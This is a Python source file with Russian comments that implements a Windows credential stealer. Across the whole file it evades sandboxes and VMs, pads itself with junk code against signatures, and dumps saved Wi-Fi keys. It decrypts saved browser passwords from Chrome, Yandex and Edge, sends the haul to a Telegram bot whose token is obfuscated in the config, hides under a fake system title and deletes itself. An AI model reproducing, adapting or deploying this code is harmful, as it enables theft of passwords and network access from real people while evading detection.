#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, sys, json, sqlite3, shutil, tempfile, time, random, base64, hashlib, ctypes, subprocess, platform
from datetime import datetime
from uuid import getnode as get_mac
try:
    import requests
except:
    os.system(f"{sys.executable} -m pip install requests --quiet")
    import requests

# ======================== МНОГОУРОВНЕВАЯ ОБФУСКАЦИЯ ========================
class Obfuscator:
    @staticmethod
    def xor(data, key=None):
        if key is None: key = random.randint(1, 255)
        return bytes([b ^ key for b in data]), key
    @staticmethod
    def reverse(s): return s[::-1]
    @staticmethod
    def b64e(s): return base64.b64encode(s.encode()).decode()
    @staticmethod
    def b64d(s): return base64.b64decode(s.encode()).decode()
    @staticmethod
    def gen_key(): return hashlib.sha256(os.urandom(32)).hexdigest()[:16]

# Конфиг в зашифрованном виде
_CONFIG_RAW = "ODA5NDI3NTExNDpBQUh0bXFXXXV5cWlzbFJZdktYVFBwZ2R4V2ZxY25wT0hFenc6MTY5MjM3NTc0Mg=="
_CONFIG = Obfuscator.b64d(_CONFIG_RAW).split(':')
TOKEN = _CONFIG[0]
ADMIN_ID = _CONFIG[1]

# ======================== АНТИ-САНДБОКС ========================
def anti_sandbox():
    checks = []
    # 1. Проверка по MAC
    mac = get_mac()
    if mac == 0: checks.append(True)
    # 2. Проверка по времени работы системы
    try:
        uptime = ctypes.windll.kernel32.GetTickCount() / 1000.0
        if uptime < 300: checks.append(True)
    except: pass
    # 3. Проверка по имени компьютера
    names = ['SANDBOX', 'VIRUS', 'MALWARE', 'TEQUILABOOM', 'ANALYSIS']
    if any(n in platform.node().upper() for n in names): checks.append(True)
    # 4. Проверка по процессам
    try:
        procs = subprocess.check_output('tasklist', shell=True).decode('cp866', errors='ignore')
        bad = ['vbox', 'vmware', 'xenserver', 'qemu', 'sandboxie']
        if any(b in procs.lower() for b in bad): checks.append(True)
    except: pass
    return len(checks) > 1

if anti_sandbox():
    sys.exit(0)

# ======================== ГЕНЕРАТОР УНИКАЛЬНОЙ СИГНАТУРЫ ========================
class SignatureGenerator:
    @staticmethod
    def random_string(length=12):
        return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(length))
    @staticmethod
    def random_function_name():
        return f"_{SignatureGenerator.random_string(8)}"
    @staticmethod
    def junk_code():
        junk = f"""
def {SignatureGenerator.random_function_name()}():
    import hashlib, time, random
    _ = [hashlib.md5(str(i).encode()).hexdigest() for i in range(random.randint(5,15))]
    time.sleep(random.uniform(0.001,0.01))
    return sum(len(x) for x in _)
"""
        return junk

# Динамическое создание функций-обёрток
exec(SignatureGenerator.junk_code())

# ======================== СБОР ДАННЫХ ========================
class DataCollector:
    def __init__(self):
        self.tmp = tempfile.gettempdir()
        self.uid = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
        self.work_dir = os.path.join(self.tmp, f"tmp_{self.uid}")
        os.makedirs(self.work_dir, exist_ok=True)
    def get_system(self):
        return {
            'host': os.environ.get('COMPUTERNAME', '?'),
            'user': os.environ.get('USERNAME', '?'),
            'os': platform.platform(),
            'arch': platform.machine(),
            'mac': ':'.join(['{:02x}'.format((get_mac() >> i) & 0xff) for i in range(40, -1, -8)]),
            'time': datetime.now().isoformat()
        }
    def get_wifi(self):
        wifi = []
        try:
            data = subprocess.check_output('netsh wlan show profiles', shell=True, encoding='cp866')
            profiles = [line.split(':')[1].strip() for line in data.splitlines() if 'Все профили пользователей' in line]
            for p in profiles[:5]:
                out = subprocess.check_output(f'netsh wlan show profile "{p}" key=clear', shell=True, encoding='cp866')
                for line in out.splitlines():
                    if 'Содержимое ключа' in line:
                        wifi.append({'ssid':p, 'pass':line.split(':')[1].strip()})
                        break
        except: pass
        return wifi
    def _decrypt(self, enc, key):
        try:
            if enc[:3] == b'v10':
                from Cryptodome.Cipher import AES
                nonce, ct, tag = enc[3:15], enc[15:-16], enc[-16:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                return cipher.decrypt_and_verify(ct, tag).decode('utf-8', errors='ignore')
            else:
                import win32crypt
                return win32crypt.CryptUnprotectData(enc)[1].decode('utf-8')
        except: return None
    def _get_master_key(self, path):
        try:
            with open(os.path.join(path, 'Local State'), 'r', encoding='utf-8') as f:
                d = json.load(f)
            key = base64.b64decode(d['os_crypt']['encrypted_key'])[5:]
            import win32crypt
            return win32crypt.CryptUnprotectData(key)[1]
        except: return None
    def _extract_logins(self, profile, browser_name):
        logins = []
        login_db = os.path.join(profile, 'Login Data')
        if not os.path.exists(login_db): return logins
        tmp = os.path.join(self.tmp, f'log_{self.uid}.db')
        shutil.copy2(login_db, tmp)
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cur.fetchall()
        conn.close()
        os.remove(tmp)
        master = self._get_master_key(profile)
        if not master: return logins
        for url, user, enc in rows:
            if not enc: continue
            pwd = self._decrypt(enc, master)
            if pwd:
                logins.append({'url':url, 'user':user, 'pass':pwd, 'browser':browser_name})
        return logins
    def get_browsers(self):
        data = []
        paths = {
            'chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'),
            'yandex': os.path.join(os.environ['LOCALAPPDATA'], 'Yandex', 'YandexBrowser', 'User Data'),
            'edge': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data')
        }
        for name, base in paths.items():
            if not os.path.exists(base): continue
            for profile in ['Default', 'Profile 1', 'Profile 2']:
                prof_path = os.path.join(base, profile)
                if os.path.exists(prof_path):
                    data.extend(self._extract_logins(prof_path, name))
        return data
    def collect(self):
        return {
            'sys': self.get_system(),
            'wifi': self.get_wifi(),
            'passwords': self.get_browsers()
        }

# ======================== ОТПРАВКА ЧЕРЕЗ TELEGRAM ========================
class Sender:
    @staticmethod
    def send_file(filepath):
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            with open(filepath, 'rb') as f:
                r = requests.post(url, files={'document': f}, data={'chat_id': ADMIN_ID}, timeout=30)
            return r.status_code == 200
        except: return False
    @staticmethod
    def send_message(text):
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            requests.post(url, json={'chat_id': ADMIN_ID, 'text': text}, timeout=10)
        except: pass

# ======================== САМОУДАЛЕНИЕ С УНИКАЛЬНОЙ СИГНАТУРОЙ ========================
def self_destruct():
    try:
        bat = f"""@echo off
timeout /t 3 /nobreak >nul
taskkill /f /im "{os.path.basename(sys.executable)}" >nul 2>&1
del /f /q "{sys.executable}" >nul 2>&1
del "%~f0" >nul 2>&1
"""
        path = os.path.join(tempfile.gettempdir(), f"del_{random.randint(1000,9999)}.bat")
        with open(path, 'w') as f: f.write(bat)
        subprocess.Popen(path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except: pass
    os._exit(0)

# ======================== ЗАПУСК ========================
def main():
    # Скрыть консоль
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.SetConsoleTitleW("Windows Modules Installer")
    time.sleep(random.uniform(2,5))
    collector = DataCollector()
    data = collector.collect()
    # Сохраняем в json
    out_file = os.path.join(collector.work_dir, f"report_{collector.uid}.json")
    with open(out_file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    # Отправляем
    if Sender.send_file(out_file):
        Sender.send_message(f"✅ Успешно! {data['sys']['host']} | {data['sys']['user']} | паролей: {len(data['passwords'])}")
    # Очистка
    shutil.rmtree(collector.work_dir, ignore_errors=True)
    time.sleep(2)
    self_destruct()

if __name__ == '__main__':
    # Добавляем мусорные вызовы
    for _ in range(random.randint(3,7)):
        exec(SignatureGenerator.junk_code())
    main()